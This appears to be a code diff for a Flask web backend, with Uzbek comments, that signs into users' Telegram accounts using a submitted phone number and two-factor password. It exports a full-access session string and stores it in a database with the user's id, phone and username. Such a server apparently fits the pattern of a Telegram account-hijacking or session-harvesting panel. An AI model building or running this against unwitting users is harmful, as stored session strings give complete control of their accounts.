@@ -3,8 +3,8 @@ import os
 import asyncio
 from flask import Flask, request, jsonify
 from flask import render_template
-
-
+from telethon.sessions import StringSession
+from database import save_session, get_db
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
 
@@ -87,34 +87,43 @@ def verify_password():
     password = request.json.get("password")
 
     async def _verify():
-        # 1️⃣ vaqtinchalik phone-session
-        temp_session = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
-        client = TelegramClient(temp_session, API_ID, API_HASH)
-
+        client = TelegramClient(
+            StringSession(),
+            API_ID,
+            API_HASH
+        )
         await client.connect()
-        await client.sign_in(password=password)
+        await client.sign_in(phone=phone, password=password)
 
         me = await client.get_me()
+
+        # 🔥 SESSION STRING
+        session_str = client.session.save()
+
         await client.disconnect()
-
-        # 2️⃣ asosiy session — USER_ID bilan
-        final_session = os.path.join(SESSIONS_DIR, str(me.id))
-        client = TelegramClient(final_session, API_ID, API_HASH)
-
-        await client.connect()
-        client.session.save()   # ❗ argument YO‘Q
-        await client.disconnect()
-
-        return me
+        return me, session_str
 
     try:
-        me = asyncio.run(_verify())
+        me, session_str = asyncio.run(_verify())
+
+        # ✅ SESSION DB GA
+        save_session(me.id, session_str)
+
+        # ✅ LOGIN QILGAN USER DB GA
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("""
+            INSERT INTO authorized_users (user_id, phone, username)
+            VALUES (%s, %s, %s)
+            ON CONFLICT (user_id) DO NOTHING
+        """, (me.id, phone, me.username))
+        conn.commit()
+        conn.close()
+
         return jsonify({"status": "ok"})
 
     except Exception as e:
-        print("VERIFY_PASSWORD ERROR:", repr(e))
-        return jsonify({"status": "error", "message": str(e)})
-
+        return jsonify({"status": "error", "message": "Login amalga oshmadi"})
 
 
 @app.route("/")
